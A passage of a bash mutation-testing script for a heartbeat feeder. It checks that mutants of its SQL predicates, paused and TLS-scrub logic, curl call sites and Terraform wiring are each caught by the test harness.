if [[ -z "$_man" ]]; then pass "manifest: both rows are external-probe, paused, arming_pending, evidenced by the workflow and the feeder invocation"
else fail "manifest violations: $(paste -sd, - <<<"$_man")"; fi
# Counted either way (a skip is one pass), so the exact floors do not depend on whether the host has bun: the
# deploy-script-tests CI job does not install it, and the manifest rows are also pinned statically just above.
cases=$((cases + 1))
if ! command -v bun >/dev/null 2>&1; then
  printf '  SKIP: the runtime manifest import needs bun, which this host does not have; the static manifest pin above still ran\n'
  pass "manifest runtime import skipped explicitly (no bun on this host)"
else
  _bm="$(cd "$REPO" && bun -e 'import { MANIFEST } from "./plugins/soleur/lib/heartbeat-manifest.ts"; const n = MANIFEST.filter((e) => ["luks_monitor_host_timer","claude_cost_capture"].includes(e.name)); console.log(n.length === 2 && n.every((e) => e.feeder && e.feeder.kind === "cron" && e.feeder.evidence.file.endsWith("scheduled-deadman-heartbeat-feeder.yml") && e.arming === "external-probe") ? "ok" : "bad");' 2>&1 | tail -1)"
  if [[ "$_bm" == ok ]]; then pass "manifest (imported at runtime via bun): both rows resolve with the cron feeder evidence"
  else fail "manifest runtime import did not resolve both rows: $_bm"; fi
fi

echo "== mutation battery: Guard 1 (the feeder never authorizes a beat without a qualifying row) =="
LAST_RC=0
run_case() { LAST_RC="$(run_feeder)"; }
verdict_holds() { [[ "$1" == "$LAST_RC" ]] && grep -qE "verdict=$2( |\$)" "$OUT"; }
MUT_TABLE="$WORK/mutations.tsv"; : > "$MUT_TABLE"
expect_red() { # <row> <name> <orig-rc> <orig-verdict> <mutant-rc> <mutant-verdict>
  cases=$((cases + 1))
  run_case
  local seen; seen="$(markers_of)"
  printf '%s\t%s\t%s\t%s\n' "$1" "$2" "${seen:-none}" "$LAST_RC" >> "$MUT_TABLE"
  if verdict_holds "$3" "$4"; then fail "mutation row $1 ($2) SURVIVED: still status $3 + verdict=$4"
  elif ! verdict_holds "$5" "$6"; then
    fail "mutation row $1 ($2) went red for another reason: status $LAST_RC verdicts [$seen], expected $5 + verdict=$6"
  else pass "mutation row $1 ($2) is RED as predicted: status $LAST_RC, verdicts [$seen]"; fi
}
static_red() { # <row> <mutant> <violation-name>
  cases=$((cases + 1))
  local v; v="$(static_violations "$2")"
  if grep -qxF "$3" <<<"$v"; then pass "mutation row $1 is RED in the static pins: $3"
  else fail "mutation row $1: expected static violation '$3', got [$(paste -sd, - <<<"$v")]"; fi
}
# The expected verdict is an ARGUMENT: a mutant that went red some OTHER valid way (query_failed, beat_failed) also
# lacks the token, and without this check that reads as the predicted loss.
expect_lost() { # <row> <desc> <ERE> <status> <verdict>: the MUTANT's run, still ending as <status>+<verdict>, must no longer carry a token the shipped feeder emits
  cases=$((cases + 1))
  run_case
  local seen; seen="$(markers_of)"
  printf '%s\t%s\t%s\t%s\n' "$1" "$2" "${seen:-none}" "$LAST_RC" >> "$MUT_TABLE"
  if ! verdict_holds "$4" "$5"; then fail "mutation row $1 ($2) went red for another reason: status $LAST_RC verdicts [${seen:-none}], expected $4 + verdict=$5"
  elif grep -qE -- "$3" "$OUT"; then fail "mutation row $1 ($2) SURVIVED: the marker still carries /$3/"
  else pass "mutation row $1 ($2) is RED as predicted: the marker no longer carries /$3/ (status $LAST_RC)"; fi
}
expect_gained() { # <row> <desc> <ERE> <status> <verdict>: the MUTANT's run, still ending as <status>+<verdict>, must carry a token the shipped feeder never emits
  cases=$((cases + 1))
  run_case
  local seen; seen="$(markers_of)"
  printf '%s\t%s\t%s\t%s\n' "$1" "$2" "${seen:-none}" "$LAST_RC" >> "$MUT_TABLE"
  if ! verdict_holds "$4" "$5"; then fail "mutation row $1 ($2) went red for another reason: status $LAST_RC verdicts [${seen:-none}], expected $4 + verdict=$5"
  elif grep -qE -- "$3" "$OUT"; then pass "mutation row $1 ($2) is RED as predicted: the output now carries /$3/ (status $LAST_RC)"
  else fail "mutation row $1 ($2) SURVIVED: the output never carries /$3/"; fi
}
residue_count() { find "$WORK/tmp" -maxdepth 1 -name 'deadman-feeder-err.*' 2>/dev/null | wc -l | tr -d ' '; }
expect_residue() { # <row> <desc>: the MUTANT must leave the secret-bearing temp file behind; the file is removed here
  cases=$((cases + 1))
  run_case
  local n; n="$(residue_count)"
  find "$WORK/tmp" -maxdepth 1 -name 'deadman-feeder-err.*' -exec rm -f -- {} + 2>/dev/null
  if [[ "$n" -ge 1 ]]; then pass "mutation row $1 ($2) is RED as predicted: $n deadman-feeder-err.* file(s) left in TMPDIR"
  else fail "mutation row $1 ($2) SURVIVED: no temp-file residue"; fi
}
# Controls of the mutation-row owners. Each is driven by one known SURVIVOR (the shipped feeder, where the
# predicted change cannot happen) and one known WRONG REASON (the run goes red, but not as predicted).
red_drv_survivor() { MUT_TABLE=/dev/null; reset_case; C_ROWS="$(row s3 "$((28 * H))" "$(luks_raw)" | fx ctlr1)"; C_Q=3; expect_red CTL-RED "known survivor" 3 no_qualifying_row 0 beat; }
red_drv_wrongreason() { MUT_TABLE=/dev/null; reset_case; C_STUB="garbage"; C_ROWS="$(row s3 "$((28 * H))" "$(luks_raw)" | fx ctlr2)"; expect_red CTL-RED "known wrong reason" 3 no_qualifying_row 0 beat; }
lost_drv_survivor() { MUT_TABLE=/dev/null; reset_case; C_ROWS="$(row s3 "$((26 * H))" "$(luks_raw)" | fx ctll1)"; C_BEATS=1; C_APIS=1; expect_lost CTL-LOST "known survivor" 'verdict=beat' 0 beat; }
lost_drv_wrongreason() { MUT_TABLE=/dev/null; reset_case; C_SRC="$WORK/mut/noverdict.sh"; expect_lost CTL-LOST "known wrong reason" 'NEVER_PRESENT_ZZ' 0 beat; }
lost_drv_othervalid() { MUT_TABLE=/dev/null; reset_case; C_STUB="garbage"; C_ROWS="$(row s3 "$((26 * H))" "$(luks_raw)" | fx ctll3)"; expect_lost CTL-LOST "another valid verdict (query_failed)" 'NEVER_PRESENT_ZZ' 0 beat; }
gained_drv_survivor() { MUT_TABLE=/dev/null; reset_case; C_ROWS="$(row s3 "$((26 * H))" "$(luks_raw)" | fx ctlg1)"; C_BEATS=1; C_APIS=1; expect_gained CTL-GAIN "known survivor" 'NEVER_PRESENT_ZZ' 0 beat; }
gained_drv_wrongreason() { MUT_TABLE=/dev/null; reset_case; C_SRC="$WORK/mut/noverdict.sh"; expect_gained CTL-GAIN "known wrong reason" 'anything' 0 beat; }
gained_drv_othervalid() { MUT_TABLE=/dev/null; reset_case; C_STUB="garbage"; C_ROWS="$(row s3 "$((26 * H))" "$(luks_raw)" | fx ctlg3)"; expect_gained CTL-GAIN "another valid verdict (query_failed)" 'verdict=query_failed' 0 beat; }
residue_drv_survivor() { MUT_TABLE=/dev/null; reset_case; C_ROWS="$(row s3 "$((26 * H))" "$(luks_raw)" | fx ctle1)"; C_BEATS=1; C_APIS=1; expect_residue CTL-RES "known survivor"; }
static_drv_survivor() { static_red CTL-STATIC "$FEEDER_SRC" slash-fail-literal; }
static_drv_wrongreason() { static_red CTL-STATIC "$M_CTL_STATIC" slash-fail-literal; }
printf '#!/usr/bin/env bash\nexit 7\n' > "$WORK/mut/noverdict.sh"; chmod +x "$WORK/mut/noverdict.sh"
M_CTL_STATIC="$(mutate ctl-static '"$QUERY" "$SQL"' '"$QUERY" --no-archive "$SQL"')"
own_ctl "expect_red() reports SURVIVED for a known survivor" "SURVIVED" red_drv_survivor
own_ctl "expect_red() reports another-reason for a known wrong-reason mutant" "went red for another reason" red_drv_wrongreason
own_ctl "expect_lost() reports SURVIVED for a known survivor" "SURVIVED" lost_drv_survivor
own_ctl "expect_lost() reports another-reason when the run has no verdict" "went red for another reason" lost_drv_wrongreason
own_ctl "expect_lost() reports another-reason when the run ends in a different VALID verdict (query_failed), however the token reads" "went red for another reason" lost_drv_othervalid
own_ctl "expect_gained() reports SURVIVED for a known survivor" "SURVIVED" gained_drv_survivor
own_ctl "expect_gained() reports another-reason when the run has no verdict" "went red for another reason" gained_drv_wrongreason
own_ctl "expect_gained() reports another-reason when the run ends in a different VALID verdict (query_failed), even though the token appears" "went red for another reason" gained_drv_othervalid
own_ctl "expect_residue() reports SURVIVED when no temp file is left behind" "SURVIVED" residue_drv_survivor
own_ctl "static_red() fails for a known survivor (the shipped feeder lacks the violation)" "expected static violation" static_drv_survivor
own_ctl "static_red() fails for a known wrong-reason mutant (a different violation)" "expected static violation" static_drv_wrongreason
# Known-positive: the shipped feeder on a qualifying fixture HOLDS; known-negative: the same detector on a 28 h fixture does not.
reset_case; C_ROWS="$(row s3 "$((26 * H))" "$(luks_raw)" | fx kp)"; C_BEATS=1; C_APIS=1; run_case
cases=$((cases + 1))
if verdict_holds 0 beat; then pass "runner known-positive: shipped feeder + 26 h fixture holds (beat)"; else fail "runner known-positive: got status $LAST_RC"; fi
reset_case; C_ROWS="$(row s3 "$((28 * H))" "$(luks_raw)" | fx kn)"; run_case
cases=$((cases + 1))
if ! verdict_holds 0 beat; then pass "runner known-negative: a 28 h fixture does not read as a beat"; else fail "runner known-negative: the detector reports a beat on a 28 h fixture"; fi

# G1-1: drop the lower dt bound from the ARCHIVE arm only (the hot arm keeps it)
land g1-1 "WHERE _row_type = 1 AND '\"\$win\"" "WHERE _row_type = 1 AND dt <= now() + INTERVAL 300 SECOND'"; _m1="$M"
reset_case; C_SRC="$_m1"; C_ROWS="$(row s3 "$((28 * H))" "$(luks_raw)" | fx g11)"; C_BEATS=1; C_APIS=1
expect_red G1-1 "archive arm loses its lower dt bound: the 28 h row beats" 3 no_qualifying_row 0 beat
cases=$((cases + 1))
reset_case; C_SRC="$_m1"; C_ROWS="$(printf '' | fx g11b)"; _g="$(run_feeder)"
_s11="$(head -1 "$SQLLOG")"
if [[ "$(grep -oF 'dt > now() - INTERVAL 97200 SECOND' <<<"$_s11" | wc -l)" == 1 && "$_s11" != "$(expect_sql "$T_LUKS" "${E_PRED[$T_LUKS]}")" ]]; then pass "G1-1: the frozen-SQL pin ALSO catches it (the sent SQL no longer equals the frozen shape; one window bound remains)"
else fail "G1-1: the SQL-text pin did not notice the dropped archive bound"; fi
# G1-2: drop the _row_type = 1 filter
land g1-2 'WHERE _row_type = 1 AND ' 'WHERE '; _m="$M"
reset_case; C_SRC="$_m"; C_ROWS="$(row s3 "$((26 * H))" "$(luks_raw)" 0 | fx g12)"; C_BEATS=1; C_APIS=1
expect_red G1-2 "_row_type filter dropped: a non-primary archive row beats" 3 no_qualifying_row 0 beat
# G1-3a: drop the s3Cluster arm entirely; G1-3b: --no-archive
land g1-3a "  SQL+=' UNION ALL '
  SQL+='SELECT dt, raw FROM s3Cluster(primary, \$BS_TABLE_S3) WHERE _row_type = 1 AND '\"\$win\"
" ''; _m="$M"
reset_case; C_SRC="$_m"; C_ROWS="$(row s3 "$((26 * H))" "$(luks_raw)" | fx g13a)"; C_BEATS=1; C_APIS=1
expect_red G1-3a "the s3Cluster arm is dropped: an archive-only row withholds" 0 beat 3 no_qualifying_row
land g1-3b '"$QUERY" "$SQL"' '"$QUERY" --no-archive "$SQL"'; _m="$M"
reset_case; C_SRC="$_m"; C_ROWS="$(row s3 "$((26 * H))" "$(luks_raw)" | fx g13b)"; C_BEATS=1; C_APIS=1
expect_red G1-3b "--no-archive handed to the helper" 0 beat 3 query_failed
static_red G1-3b "$_m" no-archive-flag
# G1-4: n == 0 falls through to the beat
land g1-4 'if [[ "$QN" == "0" ]]; then' 'if false; then'; _m="$M"
reset_case; C_SRC="$_m"; C_ROWS="$(printf '' | fx g14)"; C_BEATS=1; C_APIS=1; C_Q=1
expect_red G1-4 "an empty window falls through to the beat" 3 no_qualifying_row 0 beat
reset_case; C_SRC="$_m"; C_STUB="okstr"; C_ROWS="$(printf '' | fx g14s)"; C_BEATS=1; C_APIS=1; C_Q=1
expect_red G1-4s "the same fall-through on the quoted-string n:\"0\" answer" 3 no_qualifying_row 0 beat
# G1-5: a second curl call site, and a /fail suffix
land g1-5a "printf 'url = \"%s\"\n' \"\$HB_URL\"" "printf 'url = \"%s/fail\"\n' \"\$HB_URL\""; _m="$M"
static_red G1-5a "$_m" slash-fail-literal
reset_case; C_SRC="$_m"; C_ROWS="$(row s3 "$((26 * H))" "$(luks_raw)" | fx g15a)"; C_BEATS=1; C_APIS=1
cases=$((cases + 1)); _rc="$(run_feeder)"
if [[ "$_rc" != 0 ]] && [[ "$(count_calls '^refused beat-stdin$')" == 1 ]]; then pass "G1-5a: at run time the stub refuses a beat to a /fail URL (rc $_rc)"
else fail "G1-5a: a /fail beat was not refused at run time (rc $_rc)"; fi
land g1-5b '  HB_PAUSED="$(printf '"'%s'"' "$sel" | cut -f2)"' '  HB_PAUSED="$(printf '"'%s'"' "$sel" | cut -f2)"; printf '"'url = \"x\"\\n'"' | curl --disable --noproxy '"'*'"' -fsS --max-time 15 --connect-timeout 10 --config - 2>/dev/null'; _m="$M"
static_red G1-5b "$_m" curl-invocation-count
# G1-6: the EXIT trap lets an unknown status exit 0
land g1-6 '    0) if [ "$DECIDED" = 1 ]; then exit 0; fi ;;' '    0) exit 0 ;;'; _m6="$M"
"$PY" -I - "$_m6" "$M_FALL" "$WORK/mut/g16combo.sh" <<'PYC'
import sys
m6 = open(sys.argv[1]).read()
open(sys.argv[3], "w").write(m6.replace("  beat_once\n", "  DECIDED=0; exit 0\n", 1))
PYC
chmod +x "$WORK/mut/g16combo.sh"
reset_case; C_SRC="$WORK/mut/g16combo.sh"; C_ROWS="$(row s3 "$((26 * H))" "$(luks_raw)" | fx g16)"; C_APIS=1; run_case
cases=$((cases + 1))
if [[ "$LAST_RC" == 0 ]] && ! grep -q 'trap_remapped' "$OUT"; then pass "mutation row G1-6 is RED: with the trap hole an undecided fall-off exits 0 (the trap_remapped fixture above catches it)"
else fail "mutation row G1-6: expected an unexplained 0, got $LAST_RC [$(markers_of)]"; fi
# G1-7: skip the paused check
land g1-7 'if [[ "$HB_PAUSED" == "true" ]]; then' 'if false; then'; _m="$M"
reset_case; C_SRC="$_m"; C_ROWS="$(row s3 "$((26 * H))" "$(luks_raw)" | fx g17)"; C_API="$(hb_json "${E_NAME[$T_LUKS]}" true "$HB_URL" | fx g17api)"; C_BEATS=1; C_APIS=1
expect_red G1-7 "paused ignored: the beat is sent to a paused heartbeat" 0 qualifying_row_heartbeat_paused 0 beat
cases=$((cases + 1))
if [[ "$(count_calls '^beat$')" == 1 ]]; then pass "G1-7: the stub observed the beat to the paused heartbeat"; else fail "G1-7: no beat observed"; fi
# G1-8: anti-vacuity — an empty target table is a failure of the discovery, not a pass
land g1-8 "TARGETS=\"$T_LUKS $T_COST\"" 'TARGETS=""'; _m="$M"
cases=$((cases + 1))
if [[ -z "$(discover_targets "$_m")" ]]; then pass "mutation row G1-8 is RED: an empty target table discovers 0 targets (the anti-vacuity case above would fail)"
else fail "mutation row G1-8: the emptied table still discovered targets"; fi
# G1-9: the unknown-target arm falls through to the first target
land g1-9 '    *) return 1 ;;' "    *) select_target $T_LUKS ;;"; _m="$M"
reset_case; C_SRC="$_m"; C_TARGET="bogus"; C_NAME_OVERRIDE="${E_NAME[$T_LUKS]}"; C_ROWS="$(row s3 "$((26 * H))" "$(luks_raw)" | fx g19)"; C_BEATS=1; C_APIS=1
expect_red G1-9 "unknown target falls through to the first target" 64 usage 0 beat
# G1-10: restore the sibling's BEAT_MODE//fail branch and a fail_beat verdict
land g1-10 'beat_once() {' 'beat_once() { if [[ "${BEAT_MODE:-ok}" == "fail" ]]; then HB_URL="${HB_URL%/}/fail"; fmarker "fail_beat"; fi'; _m="$M"
static_red G1-10 "$_m" sibling-fail-arm
static_red G1-10b "$_m" slash-fail-literal
# G1-11: the answer contract mis-graded (a zero count treated as present via arithmetic fall-through)
land g1-11 '! "$nraw" =~ ^[0-9]{1,18}$' '! "$nraw" =~ ^[0-9a-z]{1,18}$'; _m="$M"
reset_case; C_SRC="$_m"; C_STUB="nonnumeric"; C_ROWS="$(row s3 "$((26 * H))" "$(luks_raw)" | fx g111)"; C_BEATS=1; C_APIS=1
expect_red G1-11 "a non-numeric n is accepted as a count" 3 query_failed 0 beat
# T1: the TLS/CA scrub removed (the stub curl refuses a call that still sees it)
land t1 'unset SSLKEYLOGFILE CURL_CA_BUNDLE SSL_CERT_FILE SSL_CERT_DIR CURL_HOME HOSTALIASES LOCALDOMAIN RES_OPTIONS' ':'; _m="$M"
reset_case; C_SRC="$_m"; C_TLSENV=1; C_ROWS="$(row s3 "$((26 * H))" "$(luks_raw)" | fx t1)"; C_BEATS=0; C_APIS=1
expect_red T1 "TLS/CA environment scrub removed" 0 beat 4 beat_failed
# T2: BS_TABLE left in the helper's environment
land t2 'unset BS_TABLE BS_TABLE_S3;' ':;'; _m="$M"
reset_case; C_SRC="$_m"; C_ROWS="$(row s3 "$((26 * H))" "$(luks_raw)" | fx t2)"; C_BEATS=1; C_APIS=1
expect_red T2 "caller's BS_TABLE not scrubbed before the helper" 0 beat 3 query_failed

echo "== mutation battery: Guard 2 (predicate fidelity) =="
G2_LUKS_NEG_UNIT="$(row s3 "$((26 * H))" "$(luks_raw luks-monitor __none__)" | fx g2u)"
land g2-1 "JSONExtractString(raw, '_SYSTEMD_UNIT') = 'luks-monitor.service' AND JSONExtractString(raw, 'message') LIKE '%OK" "JSONExtractString(raw, 'message') LIKE '%OK"; _m="$M"
reset_case; C_SRC="$_m"; C_ROWS="$G2_LUKS_NEG_UNIT"; C_BEATS=1; C_APIS=1
expect_red G2-1 "the _SYSTEMD_UNIT conjunct dropped: a verify-job row beats" 3 no_qualifying_row 0 beat
land g2-2 "LUKS-backed%' AND JSONExtractString(raw, 'host_name') = 'soleur-web-platform'" "LUKS-backed%'"; _m="$M"
reset_case; C_SRC="$_m"; C_ROWS="$(row s3 "$((26 * H))" "$(luks_raw luks-monitor luks-monitor.service "$OK_MSG" soleur-web-2)" | fx g2h)"; C_BEATS=1; C_APIS=1
expect_red G2-2 "the host_name conjunct dropped: a web-2 row beats" 3 no_qualifying_row 0 beat
land g2-3a "LIKE '%OK: /mnt/data is LUKS-backed%'" "LIKE '%OK: /mnt/data is LUKS backed%'"; _m="$M"
cases=$((cases + 1))
if grep -q '^FAIL luks: the LIKE needle equals' < <(guard2_checks "$_m" "$EMIT_LUKS" 2>&1); then pass "mutation row G2-3a is RED: a reworded needle in the feeder only fails the emitter-parity pin"
else fail "mutation row G2-3a: emitter parity did not notice the reworded needle"; fi
sed 's/OK: \/mnt\/data is LUKS-backed/OK: \/mnt\/data is encrypted/' "$EMIT_LUKS" > "$WORK/mut/luks-monitor.reworded.sh"
cases=$((cases + 1))
if ! cmp -s "$EMIT_LUKS" "$WORK/mut/luks-monitor.reworded.sh" && grep -q '^FAIL luks: the LIKE needle equals' < <(guard2_checks "$FEEDER_SRC" "$WORK/mut/luks-monitor.reworded.sh" 2>&1); then
  pass "mutation row G2-3b is RED (landed): a reworded OK line in luks-monitor.sh only fails the emitter-parity pin (both directions covered)"
else fail "mutation row G2-3b: emitter parity did not notice (or the edit did not land)"; fi
land g2-4 "= 'luks-monitor' AND JSONExtractString(raw, '_SYSTEMD_UNIT') = 'luks-monitor.service' AND JSONExtractString(raw, 'message') LIKE '%OK" "= 'luks-monitor' OR JSONExtractString(raw, '_SYSTEMD_UNIT') = 'luks-monitor.service' AND JSONExtractString(raw, 'message') LIKE '%OK"; _m="$M"
reset_case; C_SRC="$_m"; C_ROWS="$(row s3 "$((26 * H))" "$(luks_raw other-tag luks-monitor.service)" | fx g24)"; C_BEATS=1; C_APIS=1
expect_red G2-4 "the unit conjunct joined with OR: a wrong-identifier row beats" 3 no_qualifying_row 0 beat
land g2-5 " AND JSONExtractString(raw, 'message', 'op') IN ('anthropic-credit-exhausted', 'anthropic-key-invalid')))" " AND JSONExtractString(raw, 'message', 'op') IN ('anthropic-credit-exhausted', 'anthropic-key-invalid')) OR raw LIKE '%cost%')"; _m="$M"
cases=$((cases + 1))
if grep -q '^FAIL cost: exactly one OR' < <(guard2_checks "$_m" "$EMIT_LUKS" 2>&1); then pass "mutation row G2-5 is RED: a second OR arm on the cost predicate fails the exactly-two-arms pin"
else fail "mutation row G2-5: the second OR arm was not noticed"; fi
land g2-6a " AND JSONExtractString(raw, 'message', 'source') LIKE 'cron:%'" ''; _m="$M"
reset_case; C_SRC="$_m"; C_TARGET="$T_COST"; C_ROWS="$(row s3 "$((2 * H))" "$(cost_raw session:abc123)" | fx g26a)"; C_BEATS=1; C_APIS=1
expect_red G2-6a "source LIKE 'cron:%' dropped: a founder BYOK row beats" 3 no_qualifying_row 0 beat
land g2-6b "raw LIKE '%\"SOLEUR_CLAUDE_COST\":true%' AND " ''; _m="$M"
reset_case; C_SRC="$_m"; C_TARGET="$T_COST"; C_ROWS="$(row s3 "$((2 * H))" "$(cost_raw cron:x 3.1 claude-cost SOLEUR_CLAUDE_COST_DAILY)" | fx g26b)"; C_BEATS=1; C_APIS=1
expect_red G2-6b "the SOLEUR_CLAUDE_COST key match dropped: an org-total _DAILY row beats" 3 no_qualifying_row 0 beat
land g2-6c " AND JSONExtract(raw, 'message', 'cost_usd', 'Nullable(Float64)') IS NOT NULL" ''; _m="$M"
reset_case; C_SRC="$_m"; C_TARGET="$T_COST"; C_ROWS="$(row s3 "$((2 * H))" "$(cost_raw cron:x null)" | fx g26c)"; C_BEATS=1; C_APIS=1
expect_red G2-6c "the non-null cost_usd conjunct dropped: a null-cost marker beats" 3 no_qualifying_row 0 beat
land g2-7 'def_pred LUKS_PRED' 'def_pred LUKS_PRED_RENAMED'; _m="$M"
cases=$((cases + 1))
if grep -q '^FAIL both predicates are extractable' < <(guard2_checks "$_m" "$EMIT_LUKS" 2>&1); then pass "mutation row G2-7 is RED: a renamed predicate table key trips the anti-vacuity extraction pin"
else fail "mutation row G2-7: the extractor finding nothing was not noticed"; fi
echo "-- Guard 2 harness rows: the fixtures can fail, and non-canonical inputs stay green --"
reset_case; C_EVAL="$WORK/eval-allrows.py"; C_ROWS="$(row s3 "$((28 * H))" "$(luks_raw luks-monitor __none__ "$FAIL_MSG" soleur-web-2)" | fx hr1)"; C_BEATS=1; C_APIS=1; run_case
cases=$((cases + 1))
if verdict_holds 0 beat; then pass "harness row (a): an evaluator that qualifies every row flips the 28 h / web-2 / verify-job / FAIL fixtures to a beat (the fixtures CAN fail)"
else fail "harness row (a): the all-rows evaluator did not flip the negative fixture (rc $LAST_RC)"; fi
for _hn in "28h:$(row s3 "$((28 * H))" "$(luks_raw)")" "web2:$(row s3 "$((26 * H))" "$(luks_raw luks-monitor luks-monitor.service "$OK_MSG" soleur-web-2)")" "verify-job:$(row s3 "$((26 * H))" "$(luks_raw luks-monitor __none__)")"; do
  reset_case; C_EVAL="$WORK/eval-allrows.py"; C_ROWS="$(printf '%s\n' "${_hn#*:}" | fx "hra-${_hn%%:*}")"; C_BEATS=1; C_APIS=1; run_case
  cases=$((cases + 1))
  if verdict_holds 0 beat; then pass "harness row (a, ${_hn%%:*}): the all-rows evaluator flips this negative fixture to a beat (it CAN fail)"
  else fail "harness row (a, ${_hn%%:*}): the all-rows evaluator did not flip the fixture (rc $LAST_RC)"; fi
done
reset_case; C_EVAL="$WORK/eval-likeall.py"; C_ROWS="$(row s3 "$((2 * H))" "$(luks_raw luks-monitor luks-monitor.service "$FAIL_MSG")" | fx hr2)"; C_BEATS=1; C_APIS=1; run_case
cases=$((cases + 1))
if verdict_holds 0 beat; then pass "harness row (b): an evaluator whose LIKE is always true turns the FAIL-row fixture into a beat"
else fail "harness row (b): the LIKE-all evaluator did not flip the FAIL-row fixture (rc $LAST_RC)"; fi
reset_case; C_TARGET="$T_COST"; C_EVAL="$WORK/eval-likeall.py"; C_ROWS="$(row s3 "$((2 * H))" "$(cost_raw session:abc123)" | fx hr3)"; C_BEATS=1; C_APIS=1; run_case
cases=$((cases + 1))
if verdict_holds 0 beat; then pass "harness row (b2): the same evaluator turns the BYOK fixture into a beat"
else fail "harness row (b2): the LIKE-all evaluator did not flip the BYOK fixture"; fi
"$PY" -I - "$FEEDER_SRC" "$WORK/mut/reordered.sh" <<'PYR'
import re, sys
s = open(sys.argv[1]).read()
m = re.search(r"(def_pred LUKS_PRED <<'EOF'\n)(.*?)(\nEOF)", s, re.S)
parts = m.group(2).split(" AND ")
assert len(parts) == 4
new = " AND ".join([parts[3], parts[2], parts[1], parts[0]])
open(sys.argv[2], "w").write(s[:m.start(2)] + new + s[m.end(2):])
PYR
chmod +x "$WORK/mut/reordered.sh"
cases=$((cases + 1)); if ! cmp -s "$FEEDER_SRC" "$WORK/mut/reordered.sh"; then pass "must-PASS input: the reordered-conjunct feeder landed"; else fail "must-PASS input did not land"; fi
reset_case; C_SRC="$WORK/mut/reordered.sh"; C_ROWS="$(row s3 "$((26 * H))" "$(luks_raw)" | fx hr4)"; C_BEATS=1; C_APIS=1
expect "must-PASS (non-canonical): the same four conjuncts in reverse order still beat a 26 h row" 0 beat
reset_case; C_SRC="$WORK/mut/reordered.sh"; C_ROWS="$(row s3 "$((26 * H))" "$(luks_raw luks-monitor __none__)" | fx hr5)"; C_Q=3
expect "must-PASS (non-canonical): the reordered feeder still withholds the verify-job row" 3 no_qualifying_row
reset_case; C_TARGET="$T_COST"; C_ROWS="$(row s3 "$((20 * H))" "$(probe_raw anthropic-credit-exhausted)" | fx hr6)"; C_BEATS=1; C_APIS=1
expect "must-PASS (non-canonical): a 20 h old cost row with the credit-probe arm ONLY still beats" 0 beat

echo "== mutation battery: Guard 4 (wiring parity) =="
w_mut() { # <row> <file-var-name> <old> <new> -> sets WM (path) or fails
  local srcvar="$2" src out="$WORK/mut/$1.wire"
  src="${!srcvar}"
  cases=$((cases + 1))
  if "$PY" -I - "$src" "$out" "$3" "$4" <<'PYX'
import sys
s = open(sys.argv[1]).read()
if s.count(sys.argv[3]) != 1:
    sys.exit(3)
open(sys.argv[2], "w").write(s.replace(sys.argv[3], sys.argv[4]))
PYX
  then pass "mutation row $1 landed"; WM="$out"; else fail "mutation row $1 did NOT land"; WM="$src"; fi
}
wire_red() { # <row> <violation-substring> <uptime> <apply> <table> <feeder> <monitors>
  cases=$((cases + 1))
  local v; v="$(wiring_violations "$3" "$4" "$5" "$6" "$7" 2>&1)"
  if grep -qF -- "$2" <<<"$v"; then pass "mutation row $1 is RED in the wiring pins: $2"
  else fail "mutation row $1: expected wiring violation '$2', got [$(paste -sd, - <<<"$v")]"; fi
}
# block-scoped mutation: replace <old> by <new> inside the Terraform resource block <resource> only (exactly once there)
w_block() { # <row> <file-var> <resource> <old-regex-literal> <new>
  local srcvar="$2" src out="$WORK/mut/$1.wire"
  src="${!srcvar}"
  cases=$((cases + 1))
  if "$PY" -I - "$src" "$out" "$3" "$4" "$5" <<'PYX'
import re, sys
s = open(sys.argv[1]).read()
m = re.search(r'(resource "betteruptime_heartbeat" "' + re.escape(sys.argv[3]) + r'" \{\n)(.*?)(^\})', s, re.S | re.M)
if not m or m.group(2).count(sys.argv[4]) != 1:
    sys.exit(3)
body = m.group(2).replace(sys.argv[4], sys.argv[5])
open(sys.argv[2], "w").write(s[:m.start(2)] + body + s[m.end(2):])
PYX
  then pass "mutation row $1 landed"; WM="$out"; else fail "mutation row $1 did NOT land"; WM="$src"; fi
}
# w_sblock: like w_block, for the Sentry monitor resource (exactly once inside THAT block).
w_sblock() { # <row> <file-var> <old> <new>
  local srcvar="$2" src out="$WORK/mut/$1.wire"
  src="${!srcvar}"
  cases=$((cases + 1))
  if "$PY" -I - "$src" "$out" "$3" "$4" <<'PYX'
import re, sys
s = open(sys.argv[1]).read()
m = re.search(r'(resource "sentry_cron_monitor" "scheduled_deadman_heartbeat_feeder" \{)(.*?)(\n\})', s, re.S)
if not m or m.group(2).count(sys.argv[3]) != 1:
    sys.exit(3)
open(sys.argv[2], "w").write(s[:m.start(2)] + m.group(2).replace(sys.argv[3], sys.argv[4]) + s[m.end(2):])
PYX
  then pass "mutation row $1 landed"; WM="$out"; else fail "mutation row $1 did NOT land"; WM="$src"; fi
}
# Controls of the Guard 4 owners.
wmut_drv_absent() { w_mut CTL-W APPLY_WF 'TEXT_THAT_IS_NOT_IN_THE_APPLY_WORKFLOW_ZZ' 'x'; }
wblock_drv_absent() { w_block CTL-W UPTIME_TF claude_cost_capture 'TEXT_NOT_IN_THE_BLOCK_ZZ' 'x'; }
wsblock_drv_absent() { w_sblock CTL-W MONITORS_TF 'TEXT_NOT_IN_THE_BLOCK_ZZ' 'x'; }
wire_drv_survivor() { wire_red CTL-W 'tf-grace-claude_cost_capture' "$UPTIME_TF" "$APPLY_WF" "$TABLE_TS" "$FEEDER_SRC" "$MONITORS_TF"; }
wire_drv_wrongreason() { wire_red CTL-W 'tf-period-claude_cost_capture' "$M_CTL_WIRE" "$APPLY_WF" "$TABLE_TS" "$FEEDER_SRC" "$MONITORS_TF"; }
w_block ctl-wire UPTIME_TF claude_cost_capture 'grace  = 7200' 'grace  = 3600'; M_CTL_WIRE="$WM"
own_ctl "w_mut() fails when the edit does not land" "did NOT land" wmut_drv_absent
own_ctl "w_block() fails when the edit does not land" "did NOT land" wblock_drv_absent
own_ctl "w_sblock() fails when the edit does not land" "did NOT land" wsblock_drv_absent
own_ctl "wire_red() fails for a known survivor (the shipped tree lacks the violation)" "expected wiring violation" wire_drv_survivor
own_ctl "wire_red() fails for a known wrong-reason mutant (a different violation)" "expected wiring violation" wire_drv_wrongreason
w_block g4-1 UPTIME_TF claude_cost_capture 'name   = "soleur-claude-cost-capture-prd"' 'name   = "soleur-claude-cost-capture-renamed"'
wire_red G4-1 'tf-name-differs-from-script-claude_cost_capture' "$WM" "$APPLY_WF" "$TABLE_TS" "$FEEDER_SRC" "$MONITORS_TF"
w_block g4-2a UPTIME_TF claude_cost_capture 'grace  = 7200' 'grace  = 3600'
